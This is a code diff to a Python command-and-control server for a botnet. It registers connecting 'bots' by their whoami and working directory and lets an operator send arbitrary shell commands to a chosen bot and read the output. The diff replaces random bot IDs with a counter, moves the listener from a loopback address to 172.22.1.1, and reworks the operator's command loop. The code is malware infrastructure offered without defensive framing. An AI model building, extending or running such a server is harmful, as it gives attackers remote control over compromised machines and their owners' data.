@@ -6,7 +6,7 @@ import os
 from _thread import *
 import random
 
-def client_handler(connection, bots, qs):
+def client_handler(connection, bots, qs, g_bot_id):
     # client handler
     BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
     # separator string for sending 2 messages in one go
@@ -18,13 +18,7 @@ def client_handler(connection, bots, qs):
     cwd = cwd.decode()
 
     whoami = connection.recv(BUFFER_SIZE)
-    flag = False
-    while not flag:
-        bot_id = random.randrange(0, 1000, 1)
-        if bot_id not in list_of_ids:
-            list_of_ids.append(bot_id)
-            flag = True
-    bot_id = str(bot_id)
+    bot_id = str(g_bot_id)
     bots[bot_id] = whoami.decode() + " " + cwd
     input_q = queue.Queue()
     output_q = queue.Queue()
@@ -56,10 +50,12 @@ def client_handler(connection, bots, qs):
             output_q.put(results)
 
 def listener(connection, bots, qs):
+    g_bot_id = 0
     while True:
         Client, address = connection.accept()
+        g_bot_id += 1
         print('Connected to: ' + address[0] + ':' + str(address[1]))
-        handle = threading.Thread(target=client_handler, args=(Client, bots, qs, ), daemon=True)
+        handle = threading.Thread(target=client_handler, args=(Client, bots, qs, g_bot_id, ), daemon=True)
         handle.start()
         time.sleep(1)
         print(bots)
@@ -69,9 +65,8 @@ def main():
     list_of_ids = []
     bots = {}
     qs = {}
-
     ServerSocket = socket.socket()
-    host = "127.0.0.5"
+    host = "172.22.1.1"
     port = 5003
     ThreadCount = 0
     try:
@@ -88,19 +83,22 @@ def main():
         cmd_id = input("Enter computer id: ")
         if 'bots' in cmd_id:
             print(bots)
-        try:
-            input_q, output_q = qs[cmd_id]
-            cmd_lit = input("Enter command: ")
-            cmd = (cmd_id, cmd_lit)
-            if 'exitall' in cmd_lit:
-                break
-            elif 'bots' in cmd_lit:
-                print(bots)
-            else:
-                input_q.put(cmd)
-            print(output_q.get()) # print out the output
-        except KeyError:
-            print(f"There is not bot tied to this ID: {[str(x) for x in bots.keys()]}")
+        elif 'exitall' in cmd_id:
+            break
+        else:
+            try:
+                input_q, output_q = qs[cmd_id]
+                cmd_lit = input("Enter command: ")
+                cmd = (cmd_id, cmd_lit)
+                if 'exitall' in cmd_lit:
+                    break
+                elif 'bots' in cmd_lit:
+                    print(bots)
+                else:
+                    input_q.put(cmd)
+                print(output_q.get()) # print out the output
+            except KeyError:
+                print(f"There is not bot tied to this ID: {[str(x) for x in bots.keys()]}")
 
     ServerSocket.close()
 
